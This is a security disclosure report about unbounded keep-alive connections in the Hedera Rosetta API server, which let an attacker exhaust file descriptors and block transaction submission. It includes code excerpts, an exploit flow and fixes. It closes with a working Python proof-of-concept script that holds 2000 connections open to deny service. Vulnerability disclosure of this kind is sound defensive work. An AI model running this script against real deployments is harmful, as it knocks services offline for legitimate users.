### Title
Unbounded Idle HTTP Keep-Alive Connection Exhaustion Leading to File Descriptor DoS on `/construction/submit`

### Summary
The Rosetta API HTTP server in `rosetta/main.go` is constructed with no limit on the total number of concurrent TCP connections. An unprivileged attacker can open thousands of HTTP/1.1 keep-alive connections and refresh each one just before the 10-second `IdleTimeout` expires, holding file descriptors open indefinitely. Once the process file descriptor limit is exhausted, the OS rejects all new `accept()` calls, preventing any new `/construction/submit` connections and blocking transaction gossip to the Hedera network.

### Finding Description

**Exact code path:**

`rosetta/app/config/types.go`, lines 64–69 — `Http.IdleTimeout` is a plain `time.Duration` field with no associated connection-count ceiling:
```go
type Http struct {
    IdleTimeout       time.Duration `yaml:"idleTimeout"`
    ...
}
```

`rosetta/main.go`, lines 220–227 — the `http.Server` is built directly from that config with no `ConnState` hook, no `netutil.LimitListener`, and no `MaxConns` equivalent:
```go
httpServer := &http.Server{
    Addr:              fmt.Sprintf(":%d", rosettaConfig.Port),
    Handler:           corsMiddleware,
    IdleTimeout:       rosettaConfig.Http.IdleTimeout,       // 10 s default
    ReadHeaderTimeout: rosettaConfig.Http.ReadHeaderTimeout, // 3 s default
    ReadTimeout:       rosettaConfig.Http.ReadTimeout,       // 5 s default
    WriteTimeout:      rosettaConfig.Http.WriteTimeout,      // 10 s default
}
```

**Root cause:** Go's `net/http.Server` has no built-in maximum-connections field. The only mechanism that would reclaim idle connections is `IdleTimeout`, but an attacker who sends one lightweight request every ≤9.9 seconds per connection continuously resets that timer, keeping every connection alive indefinitely. The server allocates one goroutine and one file descriptor per connection; neither is bounded.

**Exploit flow:**
1. Attacker opens N TCP connections to port 5700 (default).
2. On each connection, sends a minimal valid HTTP/1.1 request (e.g., `POST /network/status`) within the 3-second `ReadHeaderTimeout` window, receives a response.
3. Every ~9 seconds, sends another lightweight request on each connection, resetting `IdleTimeout` before it fires.
4. After N connections, the process hits its file descriptor ceiling (`ulimit -n`, typically 1024 soft / 65536 hard in container environments).
5. The kernel returns `EMFILE` on `accept()`, causing `httpServer.ListenAndServe` to log errors and stop accepting new connections entirely.
6. Legitimate callers of `/construction/submit` receive connection-refused or timeout; the Rosetta server can no longer forward signed transactions to Hedera nodes.

**Why existing checks fail:**

- `IdleTimeout = 10 s`: Attacker trivially refreshes every 9 s — timer never fires.
- `ReadHeaderTimeout = 3 s` / `ReadTimeout = 5 s`: These only guard the active request phase; they do not close an idle connection that already completed a request.
- Traefik `inFlightReq: amount: 5` (`charts/hedera-mirror-rosetta/values.yaml`, lines 152–156): This limits *active in-flight requests*, not idle keep-alive connections. An idle connection waiting for its next request is invisible to this middleware.
- Traefik `rateLimit: average: 10` (lines 157–160): Limits request throughput per host, not connection count. An attacker sending one request per 9 s per connection stays well under any per-host rate limit.
- The Traefik middleware chain is gated by `global.middleware` (line 95: `middleware: false` by default), so it is **disabled in the default deployment**.
- No `netutil.LimitListener`, `ConnState` callback, or semaphore exists anywhere in the rosetta codebase (confirmed by grep across `rosetta/**`).

### Impact Explanation
File descriptor exhaustion causes the Go HTTP server to stop accepting new TCP connections entirely. The `/construction/submit` endpoint — the sole path for submitting signed transactions to Hedera consensus nodes — becomes unreachable. This directly blocks gossip of any transaction or batch of transactions to the network for the duration of the attack, constituting a complete availability failure for the construction flow. Recovery requires either the attacker stopping, an operator restarting the process, or an operator manually closing connections via OS tooling.

### Likelihood Explanation
The attack requires zero authentication, zero special knowledge, and zero exploit code beyond a standard HTTP client capable of connection pooling (e.g., `curl --keepalive`, Python `requests.Session`, or a trivial Go program). It is repeatable from a single IP or distributed across many. The default `IdleTimeout` of 10 seconds is long enough to make the refresh loop trivial. The attack is fully deterministic: once the file descriptor ceiling is reached, the DoS is immediate and total. Any publicly reachable Rosetta deployment running without a properly configured reverse proxy (the default) is directly vulnerable.

### Recommendation
1. **Wrap the listener with a connection cap** using `golang.org/x/net/netutil.LimitListener` before passing it to `httpServer.Serve()`, e.g.:
   ```go
   ln, _ := net.Listen("tcp", httpServer.Addr)
   httpServer.Serve(netutil.LimitListener(ln, 2048))
   ```
2. **Add a `ConnState` callback** to enforce per-IP connection limits and log/reject excess connections.
3. **Reduce `IdleTimeout`** to 2–3 seconds to shrink the refresh window and increase attacker cost.
4. **Enable the Traefik middleware chain** (`global.middleware: true`) in production and add a `tcpIngressRoute` or OS-level `iptables` rule capping simultaneous connections per source IP.
5. **Raise `ulimit -n`** in the container spec only as a last resort; it raises the ceiling but does not eliminate the attack.

### Proof of Concept
```bash
# Open 2000 keep-alive connections and refresh every 9 seconds
python3 - <<'EOF'
import requests, threading, time

TARGET = "http://<rosetta-host>:5700/network/status"
BODY = '{"network_identifier":{"blockchain":"Hedera","network":"testnet"},"metadata":{}}'
HEADERS = {"Content-Type": "application/json", "Connection": "keep-alive"}
SESSIONS = [requests.Session() for _ in range(2000)]

def hold(s):
    while True:
        try:
            s.post(TARGET, data=BODY, headers=HEADERS, timeout=5)
        except Exception:
            pass
        time.sleep(9)  # refresh before 10 s IdleTimeout

threads = [threading.Thread(target=hold, args=(s,), daemon=True) for s in SESSIONS]
for t in threads: t.start()

# After ~30 s, attempt a legitimate /construction/submit — it will hang or be refused
time.sleep(30)
r = requests.post(TARGET.replace("network/status","construction/submit"),
                  data='{}', headers=HEADERS, timeout=5)
print(r.status_code)  # Expected: connection error / EMFILE on server
EOF
```
On the server, `lsof -p <pid> | wc -l` will show the file descriptor count climbing to the process limit, after which new connections are rejected.